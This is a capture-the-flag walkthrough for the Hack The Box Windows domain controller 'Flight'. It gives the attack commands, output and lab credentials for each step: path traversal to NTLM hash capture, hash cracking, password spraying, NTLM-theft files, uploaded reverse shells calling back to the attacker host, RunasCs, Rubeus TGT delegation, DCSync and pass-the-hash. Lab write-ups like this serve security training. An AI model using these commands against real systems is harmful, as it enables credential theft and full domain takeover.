#box #vhost #path-traversal #responder #ntlm-theft #icacls #RunasCs #ligolo #rubeus #TGTDeleg #impacket-ticketConverter #impacket-secretsdump #impacket-psexec
## Nmap

```bash
# Nmap 7.95 scan initiated Thu Sep 18 13:28:50 2025 as: /usr/lib/nmap/nmap -sCV --min-rate=10000 -o nmap_sCV 10.129.228.120
Nmap scan report for 10.129.228.120
Host is up (0.050s latency).
Not shown: 988 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Apache httpd 2.4.52 ((Win64) OpenSSL/1.1.1m PHP/8.1.1)
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: g0 Aviation
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-09-19 00:28:56Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: flight.htb0., Site: Default-Fi#rst-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: flight.htb0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
Service Info: Host: G0; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-09-19T00:29:16
|_  start_date: N/A
|_clock-skew: 6h59m57s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Sep 18 13:29:58 2025 -- 1 IP address (1 host up) scanned in 68.25 seconds
```

## 80 - HTTP

On port 80 we discover the presence of a flight booking website. At the first sight it appears to be a static website since there are no action nor other links to other pages. Also directory / file enumeration do not provide any consistent link other than the current one.

### VHost Fuzzing

We opt to perform a [[FFuF#VHost Fuzzing|VHost Fuzzing]]:

```bash
ffuf -w /usr/share/seclists/Discovery/DNS/combined_subdomains.txt -u http://flight.htb/ -H "Host: FUZZ.flight.htb" -c -ic -fs 7069
```

And we end up discovering a virtual host name`school`.
We add that to `/etc/hosts` and we navigate onto it discovering another website. Also this website doesn't provide crucial information within the enumeration but each page change is indicated within a query parameter called `?view`.

### Path Traversal to SMB NTLMv2 Hash Stealing

We try Path Traversal and we realize that we can effectively include file from the system (within a Fuzzing/LFI wordlist). 

>We know that is a Path Traversal vulnerability since we can include file externally from the web application boundaries. A LFI vulnerability would permit to include exclusively file within the boundaries of the application (i.e. in the same folder's app). 
>With a Path Traversal vulnerability we can include, for instance `../../../../../../../etc/passwd` while with a LFI vulnerability we cannot.

To understand whether there's any protection in place we start a netcat session and try to reach it from the parameter:

```text
http://school.flight.htb/index.php?view=http://10.10.16.35:4444/test
```

![[attachments/flight-writeup-1.png]]

At this point, we try to start up a responder session to try understand whether we can steal the hash with a SSRF attack. The steps to perform the attack are explained [here](https://www.blazeinfosec.com/post/web-app-vulnerabilities-ntlm-hashes/#:~:text=Scenario%20%231%3A%20From%20SSRF%20to%20hashes).
We start up our responder session with:

```bash
responder -I tun0
```

And we then perform the attack by calling:

```text
http://school.flight.htb/index.php?view=\\10.10.16.35\test\share
```

>We mustn't specify the port in the SMB (445) port in the URL

We get:

![[attachments/flight-writeup-2.png]]

Since we do have a Path Traversal vulnerability we could try to include `index.php` and check whether there's some rule in place blocking us:

```bash
curl http://school.flight.htb/index.php?view=index.php
```

And in here we discover:

```php
if ((strpos(urldecode($_GET['view']),'..')!==false)||
    (strpos(urldecode(strtolower($_GET['view'])),'filter')!==false)||
    (strpos(urldecode($_GET['view']),'\\')!==false)||
    (strpos(urldecode($_GET['view']),'htaccess')!==false)||
    (strpos(urldecode($_GET['view']),'.shtml')!==false)
){
    echo "<h1>Suspicious Activity Blocked!";
    echo "<h3>Incident will be reported</h3>\r\n";
}else{
    echo file_get_contents($_GET['view']);	
}
}else{
    echo file_get_contents("C:\\xampp\\htdocs\\school.flight.htb\\home.html");
}
```

apparently `\\` is being blocked by `index.php`.

We can opt to reverse the slashes:

```bash
http://school.flight.htb/index.php?view=//10.10.16.35/test/share
```

Gaining the hash:

```bash
[SMB] NTLMv2-SSP Client   : 10.129.120.94
[SMB] NTLMv2-SSP Username : flight\svc_apache
[SMB] NTLMv2-SSP Hash     : svc_apache::flight:ddd4f6a393dbee95:A6D7ADEC0E7409263573E7145F951CE1:01010000000000000018B8A2B729DC01FF9F20A4F9956C000000000002000800420059004D00420001001E00570049004E002D004F00410031003500540046004F004C0043004D00310004003400570049004E002D004F00410031003500540046004F004C0043004D0031002E00420059004D0042002E004C004F00430041004C0003001400420059004D0042002E004C004F00430041004C0005001400420059004D0042002E004C004F00430041004C00070008000018B8A2B729DC0106000400020000000800300030000000000000000000000000300000493D9FF83F486640E5E12DCAF5215A403FF0A37A80325D5746A9381A3E0822F30A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310036002E00330035000000000000000000
```

We proceed to crack it with hashcat:

```bash
hashcat -m 5600 svc_apache-ntlmv2-hash.txt /usr/share/wordlists/rockyou.txt
```

Obtaining the credentials: `svc_apache:S@Ss!K@*t13`

## 135 - RPC

With this account we realize we have access to RPC and we can get the users within `enumdomusers`. We then get the users and add them to a file:

```bash
rpcclient -U 'FLIGHT/svc_apache' flight.htb -c 'enumdomusers'
```


We then format it into an user list and proceed with a password spray:

```bash
sed -i -e 's/] rid:\[.....]//g' users.txt && sed -i -e 's/user:\[//g' users.txt
```

We then create a custom wordlist:

>When trying to bruteforce or perform a password spray attack, custom wordlists might be the most important asset we have.
>First of all, we need to include the already known passwords in the list (password re-use). Then we can include any connection to what we've already found till now, years, seasons, website, text files, etc.

```text
S@Ss!K@*t13
password
season
spring
summer
autumn
winter
2020
2022
flight
school
airplane
sky
```

And start the password spray:

```bash
nxc -t 50 smb 50 10.129.120.94 -u users.txt -p psw.txt --continue-on-success
```

And discover another credential: `S.Moon:S@Ss!K@*t13`

## 445 - SMB

The main difference between `svc_apache` and `S.Moon` is the fact that `S.Moon` has write access over the Shared folder in SMB. At this point we check whether a [NTLM_Theft](https://github.com/Greenwolf/ntlm_theft.git) attack is possible by crafting special payloads that will eventually return has the hash once the Shared folder is accessed, or the file is opened.

We craft the available payloads within `NTLM_Theft`:

```bash
python3 ntlm_theft.py --generate all --server 10.10.16.35 --filename test
```

And this will generate us a folder containing all the available files that can be used for NTLM Theft. 
We proceed to upload them one at a time, until we find out which one can possibly return us the hash:

```bash
smbclient //10.129.219.164/Shared -U S.Moon 'S@Ss!K@*t13'
```

And after some trial and error we discover the working payload is: `desktop.ini` returning us the hash for the user `c.bum`

We proceed to crack it with hashcat, obtaining in the end the following pair of credentials:

`c.bum:Tikkycoll_431012284`

## 445 - SMB

By looking at the SMB folder with the user `c.bum` we see that now we're able to write in the `Web` folder.

```bash
nxc smb flight.htb -u 'c.bum' -p 'Tikkycoll_431012284' --shares
SMB         10.129.219.164  445    G0               [*] Windows 10 / Server 2019 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:False) 
SMB         10.129.219.164  445    G0               [+] flight.htb\c.bum:Tikkycoll_431012284 
SMB         10.129.219.164  445    G0               [*] Enumerated shares
SMB         10.129.219.164  445    G0               Share           Permissions     Remark
SMB         10.129.219.164  445    G0               -----           -----------     ------
SMB         10.129.219.164  445    G0               ADMIN$                          Remote Admin
SMB         10.129.219.164  445    G0               C$                              Default share
SMB         10.129.219.164  445    G0               IPC$            READ            Remote IPC
SMB         10.129.219.164  445    G0               NETLOGON        READ            Logon server share 
SMB         10.129.219.164  445    G0               Shared          READ,WRITE      
SMB         10.129.219.164  445    G0               SYSVOL          READ            Logon server share 
SMB         10.129.219.164  445    G0               Users           READ            
SMB         10.129.219.164  445    G0               Web             READ,WRITE 
```

The Web folder recalls the contents found in the initial websites discover, we might be able to gain a reverse shell by adding a shell file onto it ?

We proceed with taking `PHP PentestMonkey` reverse shell from [here](https://www.revshells.com/) and upload it onto the shar:

```bash
smb: \> cd school.flight.htb\
smb: \school.flight.htb\> put sapphire.php # that's php-reverse-shell.php renamed to be shorter and less suspicious
```

We then try to catch a reverse shell, unsuccessfully due to missing `uname` command (maybe we're not able to execute that with the target user):

![[attachments/flight-writeup-3.png]]

We then opt to use an alternative reverse shell, `PHP Ivan Sincek` and copy it to our machine, renaming it `ruby.php` for ease and then proceed again with uploading it on the share.
This time, the reverse shell will succeed, obtaining a shell as `flight\svc_apache` but this time into the machine.

## Privilege Escalation

The privilege escalation process consists in a set of lateral movements. First of all, by using `net user` (or by looking at the Users folder) we discover that also the user `C.Bum` can access this machine. We could try to change our shell session to be its user. Why would we do that? That's because inside `C:\inetpub` we discover the presence of a `development` folder which apparently is writable by the user `C.Bum`. We discover that by doing:

```bash
icacls C:\inetpub\development
C:\inetpub\development flight\C.Bum:(OI)(CI)(W)
                       NT SERVICE\TrustedInstaller:(I)(F)
                       NT SERVICE\TrustedInstaller:(I)(OI)(CI)(IO)(F)
                       NT AUTHORITY\SYSTEM:(I)(F)
                       NT AUTHORITY\SYSTEM:(I)(OI)(CI)(IO)(F)
                       BUILTIN\Administrators:(I)(F)
                       BUILTIN\Administrators:(I)(OI)(CI)(IO)(F)
                       BUILTIN\Users:(I)(RX)
                       BUILTIN\Users:(I)(OI)(CI)(IO)(GR,GE)
                       CREATOR OWNER:(I)(OI)(CI)(IO)(F)
```

`C.Bum` has `OI`, `CI` and `W` over that folder, which translates to:
*  **(OI)** - Object inherit. Objects in this container inherits this ACE. Applies only to directories.
* **(CI)** - Container inherit. Containers in this parent container inherits this ACE. Applies only to directories.\
* **W** - Write-only access

### RunasCs.exe

Since we do not have an interactive session over that machine, we cannot use the conventional RunAs because it will prompt us the password insertion but the stdin will automatically exit the password prompt. To do so, we need to leverage an alternate version of RunAs called `RunasCs`. This is a C# version of the common RunAs command which also permits us to prompt a password in-line. To do so we download [RunasCs](https://github.com/antonioCoco/RunasCs) (we chose the .zip file in which there are executables) and then we transfer it on the target machine with `IEX` or `curl` or `wget` (we also create a Temp folder to accomodate the file). Once on the machine we execute the following command to redirect the stdin/stdout to a remote host:

```bash title:"Redirecting the stdin of the new shell onto our machine on port 3268"
./RunasCs.exe C.Bum Tikkycoll_431012284 cmd.exe -r 10.10.16.35:3268
```

Obtaining a new session as `C.Bum`.

### Discovering port 8000 and tunnel with Ligolo-Ng
#ligolo 

While on the target machine, `netstat -ano` reveals to us that port 8000 is open on the target machine. Sadly, this port is firewalled and we cannot access it from outside. We then set up a tunneling with [ligolo-ng](https://github.com/nicocha30/ligolo-ng) to effectively reach the target endpoint (which is basically hosting the content of `C:\inetpub\development\development`).

After [setting up a Tunneling with ligolo-ng](obsidian://open?vault=Pentesting&file=Commands%20Cheatsheets%2Fligolo-ng) (on the `svc_apache` session, since we'll then need to use the `C.Bum` to proceed with the escalation process), we reach the website on our end on `http://240.0.0.1:8000/` (which is the link of the subnet we create during our tunneling set up) and we discover another website in there. 
By trying accessing the files in the `development` folder, we realize that inside `inetpub` there are two development folder, one contained into the other. We must decide where to put the shell and properly access the correct path.
Since we have write access on `C:\inetpub\development` we could try to upload a shell in there and try to get a connection as the IIS user. To achieve a reverse shell we'll use this [aspx Reverse Shell](https://github.com/borjmz/aspx-reverse-shell/blob/master/shell.aspx) (we need the shell in aspx since it's running on IIS).
We'll then open our listener and we'll receive a connection:

![[attachments/flight-writeup-4.png]]

>Whenever an user does not have the domain name in front of it, it means the user is a SYSTEM account. In this case `defaultapppool` has in front `iis apppool` instead of `flight`. That means we own a SYSTEM account
### TGTDeleg to DCSync

Since our user is a system account, we could perform a TGTDelegation attack to retrieve. To perform a TGTDeleg we'll use [Rubeus](https://github.com/GhostPack/Rubeus) `/tgtdeleg` feature.

```bash
./rubeus.exe tgtdeleg /nowrap #nowrap returns us a ticket.kirbi without \n
```

Within this ticket, we can now convert it into a `ccache` file with `impacket-ticketConverter`:

```bash
impacket-ticketConverter ticket.kirbi ticket.ccache
```

At first, the binary will return us `unknown file format`. To fix this, we can decode `ticket.kirbi` from base64:

```bash
cat ticket.kirbi | base64 -d > ticketnew.kirbi
```

And then process the new ticket:

```bash
impacket-ticketConverter ticketnew.kirbi ticket.ccache
```

We then add the `ccache` file to the env variable `KRB5CCNAME`:

```bash
export KRB5CCNAME=ticket.ccache
```

And we can now perform a DCSync to extrapolate the hashes of the administrator:

```bash
impacket-secretsdump -k -no-pass -just-dc-user administrator g0.flight.htb

Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:43bbfc530bab76141b12c8446e30c17c:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:08c3eb806e4a83cdc660a54970bf3f3043256638aea2b62c317feffb75d89322
Administrator:aes128-cts-hmac-sha1-96:735ebdcaa24aad6bf0dc154fcdcb9465
Administrator:des-cbc-md5:c7754cb5498c2a2f
[*] Cleaning up... 
```

>If it prompts a `KRB_AP_ERR_SKEW(Clock skew too great)` error, we can fix it with `sudo ntpdate g0.flight.htb` to synchronize our clock to the DCs one
### Connecting into the machine as Administrator

We can finally connect to the DC as the Administrator of the DC with `impacket-psexec` with a PtH authentication:

```bash
impacket-psexec administrator@10.129.228.120 -hashes aad3b435b51404eeaad3b435b51404ee:43bbfc530bab76141b12c8446e30c17c
```

Obtaining control over the domain.